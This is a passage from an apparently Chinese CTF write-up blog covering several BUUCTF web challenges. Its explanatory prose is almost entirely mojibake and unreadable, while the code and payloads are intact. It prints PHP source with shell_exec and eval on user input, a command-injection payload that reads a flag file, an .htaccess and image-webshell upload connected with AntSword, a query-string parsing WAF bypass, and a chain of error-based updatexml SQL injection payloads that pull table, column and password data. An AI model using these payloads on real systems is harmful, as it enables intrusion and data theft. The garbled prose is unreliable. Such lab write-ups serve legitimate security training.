<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">&lt;pre&gt;/?ip=</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>çœ‹åˆ°ipæœ‰å¾ˆå¤šæ­£åˆ™åŒ¹é…çš„å­—ç¬¦ï¼Œæ‰€ä»¥æ²¡æœ‰é‚£ä¹ˆå®¹æ˜“ç»•è¿‡</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">shell_exec </span>â€” é€šè¿‡ <span class="keyword">shell </span>ç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›ã€‚</span><br><span class="line"><span class="keyword">shell_exec(string </span>$cmd): string</span><br><span class="line">exec æ˜¯ <span class="keyword">Shell </span>å†…ç½®å‘½ä»¤ï¼Œå®ƒæœ‰ä¸¤ç§ç”¨æ³•ï¼Œä¸€ç§æ˜¯æ‰§è¡Œ <span class="keyword">Shell </span>å‘½ä»¤ï¼Œä¸€ç§æ˜¯æ“ä½œæ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">ping -c <span class="built_in">Count</span> æŒ‡å®šè¦è¢«å‘é€ï¼ˆæˆ–æ¥æ”¶ï¼‰çš„å›é€ä¿¡å·è¯·æ±‚çš„æ•°ç›®ï¼Œç”± <span class="built_in">Count</span> å˜é‡æŒ‡å‡º</span><br><span class="line">--(æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åªèƒ½è¾“å…¥å››ä¸ªå­—ç¬¦)--</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">print_rå‡½æ•°ç”¨äºæ‰“å°å˜é‡ï¼Œä»¥æ›´å®¹æ˜“ç†è§£çš„å½¢å¼å±•ç¤º</span><br><span class="line"></span><br><span class="line">ä¾‹å­</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span> (<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;c&#x27;</span> =&gt; <span class="keyword">array</span> (<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>)); </span><br><span class="line"><span class="title function_ invoke__">print_r</span> (<span class="variable">$a</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è¾“å‡ºç»“æœ</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [a] =&gt; apple</span><br><span class="line">    [b] =&gt; banana</span><br><span class="line">    [c] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; x</span><br><span class="line">            [<span class="number">1</span>] =&gt; y</span><br><span class="line">            [<span class="number">2</span>] =&gt; z</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>flagè¿‡æ»¤è¯­å¥çš„æ„æ€åˆ¤æ–­æ˜¯å¦æŒ‰é¡ºåºå‡ºç°flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="built_in">if</span>(<span class="built_in">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))</span><br></pre></td></tr></table></figure></div>

<p>æ‰€ä»¥åªè¦ipé‡Œçš„flagå‡ºç°ä¸æŒ‰é¡ºåºå°±è¡Œï¼Œä¹Ÿå°±æ˜¯flagå¦ä¸€ç§æ–¹å¼è¡¨ç¤º</p>
<p>æˆ‘ä»¬çœ‹æºç çŸ¥é“æœ‰ä¸¤ä¸ªå˜é‡ï¼Œä¸€ä¸ªæ˜¯$ip,$a</p>
<p>ipå˜é‡æ— æ³•æ”¹å˜ï¼Œå˜é‡aå¯ä»¥å°è¯•èµ‹å€¼flagè¯•è¯•èƒ½ä¸èƒ½ç»•è¿‡æ­£åˆ™åŒ¹é…ï¼Œä½†æ˜¯å¦‚æœæ˜¯a=flagï¼Œå°±ä¼šé¡ºåºå‡ºç°flagï¼ŒåŒ¹é…ï¼Œæ‰€ä»¥è¯•è¯•a=gï¼Œflagâ€“&gt;fla$a</p>
<p><code>?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</code></p>
<p>æŸ¥çœ‹æºç </p>
<p>å¾—åˆ°flag</p>
<h2 id="3-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#3-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="3.[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>3.[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><h3 id="1-é¢˜ç›®æè¿°-1"><a href="#1-é¢˜ç›®æè¿°-1" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-1"><a href="#2-wp-1" class="headerlink" title="2)wp"></a>2)wp</h3><p> çœ‹æ ‡é¢˜çŸ¥é“è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®ï¼Œè¦æ±‚ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710111959632.png" alt="image-20220710111959632"></p>
<p>æ‰“å¼€å…ˆçœ‹åˆ°ä¸€ä¸ªå°¸ä½“åœ¨åœ¨ç¬‘ï¼Œæˆ‘ä»¬å…ˆè¯•è¯•èƒ½ä¸èƒ½ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710112344441.png" alt="image-20220710112344441"></p>
<p>çœ‹æ¥ä¸è¡Œï¼Œé‚£åœ¨è¯•è¯•èƒ½ä¸èƒ½æŠ“åŒ…ä¿®æ”¹å‰ç«¯æ–‡ä»¶åç¼€åï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯å‰ç«¯éªŒè¯ï¼ŒæŠŠphpæ”¹æˆpngï¼Œåœ¨æŠ“åŒ…ä¿®æ”¹åç¼€ä¸ºphp</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710112344441.png" alt="image-20220710112344441"></p>
<p>è¿˜æ˜¯ä¸€æ ·ï¼Œè¿˜æœ‰ä¸€ä¸ªçŒœæƒ³å°±æ˜¯MIMEéªŒè¯ï¼Œå¯¹content-typeè¿›è¡Œäº†æ£€æŸ¥ï¼Œå¯ä»¥è¯•è¯•ä½¿ç”¨bp<a href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">æŠ“åŒ…</a>ï¼Œä¿®æ”¹ä¸Šä¼ çš„PHPçš„content-typeä¸ºimage/pngï¼Œä½†æ˜¯è¿˜æ˜¯ä¸€æ ·çš„</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710112344441.png" alt="image-20220710112344441"></p>
<p>äºæ˜¯ï¼Œå¯ä»¥ç”¨.htaccesså®ç°å›¾ç‰‡é©¬ä»¥phpæ–‡ä»¶å½¢å¼è¯»å–ï¼ˆå¦‚æœä¸äº†è§£å¯ä»¥æŠŠ.htaccessæ–‡ä»¶äº†è§£ä¸€ä¸‹ï¼ŒæŠŠçº¿ä¸‹é¶åœºupload-labsåšä¸€ä¸‹ï¼‰</p>
<p>ä½†æ˜¯ä¸Šä¼ æ—¶ï¼Œåˆè¢«è¿‡æ»¤äº†</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710112344441.png" alt="image-20220710112344441"></p>
<p>å°è¯•ä¿®æ”¹æ–‡ä»¶åä¸º.htaccess.pngï¼Œç„¶åç”¨bpæŠ“åŒ…ä¿®æ”¹å›.htaccessï¼Œä¸Šä¼ æˆåŠŸ</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710114410888.png" alt="image-20220710114410888"></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710114422488.png" alt="image-20220710114422488"></p>
<p>ç„¶åä¸Šä¼ å›¾ç‰‡æœ¨é©¬</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710114444539.png" alt="image-20220710114444539"></p>
<p>æŠŠè·¯å¾„å¤åˆ¶ä¸€ä¸‹</p>
<p><code>http://424ad9a4-20e6-4394-8150-06fc204ba3e0.node4.buuoj.cn:81/upload/9d0fb395a11b49196f664cfa8fe0200a/1.png</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710114617412.png" alt="image-20220710114617412"></p>
<p>èšå‰‘è¿æ¥æˆåŠŸ</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710114647722.png" alt="image-20220710114647722"></p>
<p>åœ¨æ ¹ç›®å½•å‘ç°flag</p>
<p>å¾—åˆ°flag</p>
<h2 id="4-RoarCTF-2019-Easy-Calc"><a href="#4-RoarCTF-2019-Easy-Calc" class="headerlink" title="4.[RoarCTF 2019]Easy Calc"></a>4.[RoarCTF 2019]Easy Calc</h2><h3 id="1-é¢˜ç›®æè¿°-2"><a href="#1-é¢˜ç›®æè¿°-2" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-2"><a href="#2-wp-2" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿˜æ˜¯å¾—çœ‹å¤§ä½¬å¾—wpæ‰ä¼š</p>
<p><a href="https://blog.csdn.net/weixin_44077544/article/details/102630714">åŸæ–‡é“¾æ¥</a></p>
<p>è¿™æ˜¯calc.phpçš„å†…å®¹ï¼ŒæŸ¥çœ‹æºç å°±å¯ä»¥çœ‹åˆ°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>

<p>wafä¸»è¦å°±æ˜¯çœ‹æœ‰æ²¡æœ‰éæ•°å­—å­˜åœ¨ï¼Œç»•è¿‡wafå°±å¥½æ“ä½œäº†</p>
<hr>
<p>1.1PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§</p>
<p>è¿™æ˜¯åˆ«äººå¯¹PHPå­—ç¬¦ä¸²è§£ææ¼æ´çš„ç†è§£ï¼Œ<br>æˆ‘ä»¬çŸ¥é“PHPå°†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆåœ¨URLæˆ–æ­£æ–‡ä¸­ï¼‰è½¬æ¢ä¸ºå†…éƒ¨$_GETæˆ–çš„å…³è”æ•°ç»„$_POSTã€‚</p>
<p>ä¾‹å¦‚ï¼š/?foo=barå˜æˆArray([foo] =&gt; â€œbarâ€)ã€‚</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²åœ¨è§£æçš„è¿‡ç¨‹ä¸­ä¼šå°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–ç”¨ä¸‹åˆ’çº¿ä»£æ›¿ã€‚</p>
<p>ä¾‹å¦‚ï¼Œ/?%20news[id%00=42ä¼šè½¬æ¢ä¸ºArray([news_id] =&gt; 42)ã€‚</p>
<p>å¦‚æœä¸€ä¸ªIDS/IPSæˆ–WAFä¸­æœ‰ä¸€æ¡è§„åˆ™æ˜¯å½“news_idå‚æ•°çš„å€¼æ˜¯ä¸€ä¸ªéæ•°å­—çš„å€¼åˆ™æ‹¦æˆªï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨ä»¥ä¸‹è¯­å¥ç»•è¿‡ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HAXE"><figure class="iseeu highlight /haxe"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">new</span><span class="type">s</span>.php?%<span class="number">20</span><span class="keyword">new</span><span class="type">s</span>[id%<span class="number">00</span>=<span class="number">42</span><span class="string">&quot;+AND+1=0â€“</span></span><br></pre></td></tr></table></figure></div>

<p>ä¸Šè¿°PHPè¯­å¥çš„å‚æ•°%20news[id%00çš„å€¼å°†å­˜å‚¨åˆ°$_GET[â€œnews_idâ€]ä¸­ã€‚</p>
<p><u><strong>PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š</strong></u></p>
<pre><code>1.åˆ é™¤ç©ºç™½ç¬¦

2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰
</code></pre>
<p>æˆ‘çš„ç†è§£ï¼š<br>å‡å¦‚wafä¸å…è®¸numå˜é‡ä¼ é€’å­—æ¯ï¼š</p>
<pre><code>http://www.xxx.com/index.php?num = aaaa   //æ˜¾ç¤ºéæ³•è¾“å…¥çš„è¯
</code></pre>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨numå‰åŠ ä¸ªç©ºæ ¼ï¼š</p>
<pre><code>http://www.xxx.com/index.php? num = aaaa
</code></pre>
<p>è¿™æ ·wafå°±æ‰¾ä¸åˆ°numè¿™ä¸ªå˜é‡äº†ï¼Œå› ä¸ºç°åœ¨çš„å˜é‡å«â€œï¼ˆç©ºæ ¼ï¼‰numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚</p>
<p>ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼š<u>å…ˆæŠŠç©ºæ ¼ç»™å»æ‰</u>ï¼Œè¿™æ ·æˆ‘ä»¬çš„ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚</p>
<hr>
<p>var_dump() </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">åˆ—ä¸¾æ•°ç»„å†…å®¹</span><br></pre></td></tr></table></figure>

<p>scandir() çš„ä½¿ç”¨ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="code"><pre><span class="line">scandir(<span class="built_in">directory</span>,sorting_order,<span class="built_in">context</span>);</span><br><span class="line"></span><br><span class="line"> è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„,å°±æ˜¯æ˜¾ç¤ºæ–‡ä»¶å¤¹åå­—</span><br></pre></td></tr></table></figure></div>

<p>file_get_contents() çš„ä½¿ç”¨ï¼š</p>
<pre><code>åŸå‹ï¼šfile_get_contents(path,include_path,context,start,max_length)
file_get_contents() å‡½æ•°æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚
å’Œ file() ä¸€æ ·ï¼Œä¸åŒçš„æ˜¯ file_get_contents() æŠŠæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚
file_get_contents() å‡½æ•°æ˜¯ç”¨äºå°†æ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ã€‚å¦‚æœæ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè¿˜ä¼šä½¿ç”¨å†…å­˜æ˜ å°„æŠ€æœ¯æ¥å¢å¼ºæ€§èƒ½ã€‚
å°±æ˜¯æ˜¾ç¤ºæ–‡ä»¶å†…å®¹
</code></pre>
<hr>
<p>chr(47)æ˜¯<code>/</code>çš„ASCIIç¼–ç ï¼›ã€<code>/</code>å°±æ˜¯æ ¹ç›®å½•ï¼Œå¯ä»¥å…ˆè®¿é—®ä¸€ä¸‹æ ¹ç›®å½•ï¼Œæ‰¾æ‰¾å¤§æ¦‚flagåœ¨å“ªé‡Œã€‘</p>
<p>chr(102)æ˜¯<code>f</code>çš„ASCIIç¼–ç ï¼›</p>
<p>chr(49)æ˜¯<code>1</code>çš„ASCIIç¼–ç ï¼›</p>
<p>chr(97)æ˜¯<code>a</code>çš„ASCIIç¼–ç ï¼›</p>
<p>chr(103)æ˜¯<code>g</code>çš„ASCIIç¼–ç ã€‚</p>
<p>ã€å­—ç¬¦é—´ç”¨<code>.</code>è¿æ¥ï¼Œå¦‚<code>flag</code>-&gt;<code>chr(102).chr(49).chr(97).chr(103)</code>ã€‘</p>
<p>æ ¹æ®phpè§£æå­—ç¬¦ä¸²çš„ç‰¹æ€§</p>
<p>å…ˆè¯•è¯•è¿”å›çœ‹çœ‹æ ¹ç›®å½•ï¼ˆ/ï¼‰ä¸‹çš„æ–‡ä»¶æœ‰å“ªäº›</p>
<p><code>http://node4.buuoj.cn:29105/calc.php?  num=var_dump(scandir(chr(47)))</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220819232248275.png" alt="image-20220819232248275"></p>
<p>çœ‹åˆ°æœ‰ä¸ª<code>flagg</code></p>
<p>è¿”å›çœ‹çœ‹<code>/flagg</code>é‡Œçš„å†…å®¹</p>
<p><code>http://node4.buuoj.cn:29105/calc.php?  num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220819234552921.png" alt="image-20220819234552921"></p>
<h2 id="5-æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#5-æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="5.[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>5.[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><h3 id="1-é¢˜ç›®æè¿°-3"><a href="#1-é¢˜ç›®æè¿°-3" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-3"><a href="#2-wp-3" class="headerlink" title="2)wp"></a>2)wp</h3><p>çœ‹åå­—ï¼ŒçŒœæµ‹è¿™ä¸ªsqlæ³¨å…¥è¿‡æ»¤å¾ˆä¸¥</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821144626428.png" alt="image-20220821144626428"></p>
<p>å…ˆè¯•è¯•fuzzæµ‹è¯•ï¼Œçœ‹çœ‹è¿‡æ»¤äº†å“ªäº›ï¼Œå‘ç°unionè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨è”åˆæ³¨å…¥</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821144002573.png" alt="image-20220821144002573"></p>
<p>ä½†æ˜¯å‘ç°updatexmlæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥è¯•è¯•æŠ¥é”™æ³¨å…¥</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821145036408.png" alt="image-20220821145036408"></p>
<p>å…ˆæ„é€ payload</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">?username=<span class="number">1</span><span class="meta">&amp;password=1&#x27;or updatexml(1,concat(0x7e,database(),0x7e),1)%23</span></span><br><span class="line">ã€è¿™é‡Œ+è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™é‡Œç”¨<span class="meta">#ã€‘</span></span><br></pre></td></tr></table></figure>

<p>ç»“æœå‘ç°ç»“æœåˆè¢«è¿‡æ»¤äº†ï¼Œåé¢ç”¨fuzzåˆæµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°ç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œç”¨%0aå’Œå…¶ä»–ç¬¦å·ä¹Ÿä¸èƒ½æ›¿æ¢ï¼Œæ‰€ä»¥åªèƒ½è¯•è¯•()æŠŠç»“æœæ¡†èµ·æ¥è¯•è¯•èƒ½ä¸èƒ½ç»•è¿‡</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MATLAB"><figure class="iseeu highlight /matlab"><table><tr><td class="code"><pre><span class="line">?username=<span class="number">1</span>&amp;password=<span class="number">1</span>&#x27;or(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">%23</span></span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°æ•°æ®åº“å</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821172827984.png" alt="image-20220821172827984"></p>
<p>åé¢å°±æ˜¯å·®ä¸å¤šäº†ï¼Œä½†æ˜¯è¦æ³¨æ„ä¸èƒ½ç”¨ç©ºæ ¼ï¼Œè¦ç”¨()æ¡†ä½å¯¹è±¡</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="string">&#x27;geek&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br><span class="line">ã€è¿™é‡Œçš„=ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ç”¨<span class="keyword">like</span>æ›¿æ¢ã€‘</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°è¡¨å</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821173920231.png" alt="image-20220821173920231"></p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)<span class="keyword">like</span>(<span class="string">&#x27;H4rDsq1&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°åˆ—å</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821174239954.png" alt="image-20220821174239954"></p>
<p>ç„¶åçœ‹çœ‹åˆ—é‡Œæ•°æ®æ‰¾æ‰¾flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="REASONML"><figure class="iseeu highlight /reasonml"><table><tr><td class="code"><pre><span class="line">?username=<span class="number">1</span>&amp;password=<span class="number">1</span>&#x27;<span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group<span class="constructor">_concat(<span class="params">id</span>,<span class="params">username</span>,<span class="params">password</span>)</span>)from(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure></div>

<p>çœ‹å›æ˜¾çŸ¥é“flagåœ¨passwordé‡Œï¼Œä½†ä¸ºä»€ä¹ˆæ˜¾ç¤ºä¸å…¨ï¼Œ<strong>æ˜¯å› ä¸ºupdatexmlæŠ¥é”™å›æ˜¾çš„æ•°æ®é™åˆ¶æœ€å¤š32ä½ï¼Œæ‰€ä»¥æ— æ³•æ˜¾ç¤ºå…¨flag</strong></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821174509553.png" alt="image-20220821174509553"></p>
<p>æ‰€ä»¥å¯ä»¥ç”¨leftå’Œrightå‡½æ•°è¿›è¡Œåˆ†æ®µæ˜¾ç¤ºï¼Œæœ¬æ¥æƒ³ç”¨stustrå‡½æ•°ï¼Œä½†æ˜¯å‘ç°ä¹Ÿè¢«è¿‡æ»¤äº†</p>
